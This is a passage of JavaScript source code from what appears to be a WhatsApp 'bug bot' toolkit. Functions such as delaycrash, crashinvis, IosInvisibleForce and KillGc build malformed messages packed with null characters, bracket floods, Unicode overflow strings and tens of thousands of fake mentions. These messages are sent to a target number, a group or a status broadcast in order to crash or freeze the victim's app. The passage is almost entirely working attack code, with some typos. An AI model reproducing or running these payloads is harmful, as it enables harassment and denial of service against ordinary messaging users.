                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text:
                '—!s`vinzzoffc' +
                '{['.repeat(80000) +
                `~@1~\n`.repeat(25000),
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "\u200B",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: null,
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

async function paymentDelay(vinzzoffc, target) {
  try {
    let payMessage = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0010".repeat(0x2710),
                payment_timestamp: null,
                share_payment_status: true,
              }),
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msgPay = generateWAMessageFromContent(target, payMessage, {});
    await vinzzoffc.relayMessage(target, msgPay.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: msgPay.key.id,
      participant: { jid: target },
      userJid: target,
    });

    const msgStory = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
              },
              body: {
                text: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸",
                format: "DEFAULT",
              },
            },
          },
        },
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9),
      }
    );

    await vinzzoffc.relayMessage("status@broadcast", msgStory.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
      statusJidList: [target],
      messageId: msgStory.key.id,
    });

  } catch (err) {}
}

async function MamakloeBlank(vinzzoffc, target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "1@g.us",
      inviteCode: "ꦽ".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "Mamakloe Blank❗" + "ꦾ".repeat(2500),
      caption: "Mamakloe Blank❗"+ "ꦾ".repeat(2000),
      body: {
        text:
          "\u200B" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
  };
  await vinzzoffc.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function VisAsepXop(vinzzoffc, target, mention = true) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "VinzzNotDev",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    });

    await vinzzoffc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    await sleep(2000);

    if (msg) {
        await vinzzoffc.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25,
                    },
                },
            },
        }, {});
    }
}

async function delaycrash(vinzzoffc, target, mention = false) {
  try {
    const msgContent1 = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                  },
                },
                body: {
                  text: "" + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
            }
          }
        }
      }
    };
    
    const pack1 = generateWAMessageFromContent(target, msgContent1, { userJid: target });
    await vinzzoffc.relayMessage(target, pack1.message, { messageId: pack1.key.id });
    
    const msgContent2 = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const pack2 = generateWAMessageFromContent(target, { message: msgContent2 }, { userJid: target });
    await vinzzoffc.relayMessage(target, pack2.message, { messageId: pack2.key.id });
    
    const msgContent3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000)
              }
            },
            body: {
              text: ""
            },
            interactiveResponseMessage: {
              body: { text: "", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                status: true,
                messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                paramsJson: JSON.stringify({
                  "screen_0_TextInput_0": "radio - buttons" + "ꦾ".repeat(70000),
                  "screen_0_Dropdown_2": "001-Grimgar",
                  "screen_0_RadioButtonsGroup_3": "0_true",
                  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            }
          }
        }
      }
    };

    const pack3 = generateWAMessageFromContent(target, msgContent3, { userJid: target });
    await vinzzoffc.relayMessage(target, pack3.message, { messageId: pack3.key.id });    
    
    const msgContent4 = {
      extendedTextMessage: {
        text: "᬴".repeat(250000),
        contextInfo: {
          mentionedJid: Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        }
      },
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
        mimeType: "audio/mpeg",
        sha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
        encSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
        directPath: "/v/t62.7114-24/30578226.enc",
        fileLength: 99999999999999,
        mediaKeyTimestamp: 99999999999999,
        seconds: 99999999999999,
        fileEncSha256: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
      }
    };

    const pack4 = generateWAMessageFromContent(target, { message: msgContent4 }, { userJid: target });
    await vinzzoffc.relayMessage(target, pack4.message, { messageId: pack4.key.id });

    if (mention) {
      await vinzzoffc.relayMessage(target, {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: pack2.key, type: 25 } }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "( # )" },
          content: undefined
        }]
      });
    }

  } catch (err) {
    console.error("Error in delaycrash:", err);
  }
}

async function IosInvisibleForce(vinzzoffc, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "VinzzDev\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/VinzzOfficial",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "Vaxilon",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await vinzzoffc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function crashinvis(vinzzoffc, target) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await vinzzoffc.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©LuciferNotDev",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: vinzzoffc.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await vinzzoffc.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await vinzzoffc.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await vinzzoffc.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝗣𝗛𝗢𝗘𝗡𝗜𝗫 •𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝗣𝗛𝗢𝗘𝗡𝗜𝗫 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await vinzzoffc.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await vinzzoffc.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=...",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

  } catch (err) {
    console.error("❌ Error in function bug axgankBug:", err);
  }
}

async function InvisibleStc(vinzzoffc, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await vinzzoffc.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

async function Mesex(vinzzoffc, target) {
  for (let i = 0; i < 1000; i++) {
    const msg = await generateWAMessageFromContent(jid, {
      viewOnceMessagw: {
        message: {
          messageContextInfo: {
            deviceListMetada: {},
            deviceListMetadaVersion: 2
          },
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              fromMe: false,
              participant: target,
              forwardingScore: 9999,
              isForwarded: true,
              entryPointConversionSource: "address_message",
            }
          }
        }
      }
    }, {});

    await vinzzoffc.relayMessage(target, {
      groupStatusMessageV2: {
       message: msg.message
      }
    }, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
    await new Promise((r) => setTimeout(r, 1000));
  }
  const mesex = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "KELRA",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"KELRA\",\"tower_number\":\"KELRA\",\"city\":\"JAWA\",\"name\":\"KELRA\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"KELRA | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid: target });

  await vinzzoffc.relayMessage(target, mesex.message, {
    participant: { jid:target },
    messageId: mesex.key.id
  });
}

async function KillGc(vinzzoffc, groupJid) {
  try {
    await vinzzoffc.relayMessage(
      groupJid,
      {
        locationMessage: {
          degreesLatitude: 1010101,
          degreesLongitude: 1010101,
          name: "Crash Group By Vinzz",
          address: "Maklowh Anjeng"
        }
      },
      {
        messageId: null
      }
    );
  } catch (error) {
    console.error("Error sending message:", error);
  }
}

async function Delayyyx(vinzzoffc, target) {
  const xvzz = {
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 922.9999999999999,
                  name:
                    "ϰανιєηzz ֬ιѕ нєяє" + "ꦾ".repeat(40000),
                  url: "https://t.me/VinzzOfficial",
                  contextInfo: {
                    externalAdReply: {
                      quotedAd: {
                        advertiserName: "ꦾ".repeat(40000),
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "ϰανιєηzz ֬ιѕ нєяє",
                      },
                      placeholderKey: {
                        remoteJid: "0@g.us",
                        fromMe: true,
                        id: "ABCDEF1234567890",
                      },
                    },
                  },
                },
              },
              body: {
                text: "ϰανιєηzz ֬ιѕ нєяє",
              },
              nativeFlowMessage: {
                messageParamsJson: "{[",
                messageVersion: 3,
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "RIVIEW",
                      flow_cta: "ꦾ".repeat(10000),
                      flow_message_version: "3",
                    }),
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "RIVIEW",
                      flow_cta: "ꦾ".repeat(10000),
                      flow_message_version: "3",
                    }),
                  },
                ],
              },
              contextInfo: {
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "\u0000".repeat(15000),
                      format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                      name: "address_message",
                      paramsJson: "\u0000".repeat(1045000),
                      version: 3,
                    },
                    entryPointConversionSource: "call_permission_request",
                  },
                  body: {
                    text: "\u0000".repeat(15000),
                    format: "DEFAULT",
                  },
                },
              },
            },
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    xvzz,
    {}
  );

  await vinzzoffc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
  });
}

async function DelayBulldoV2(vinzzoffc, target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "$",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
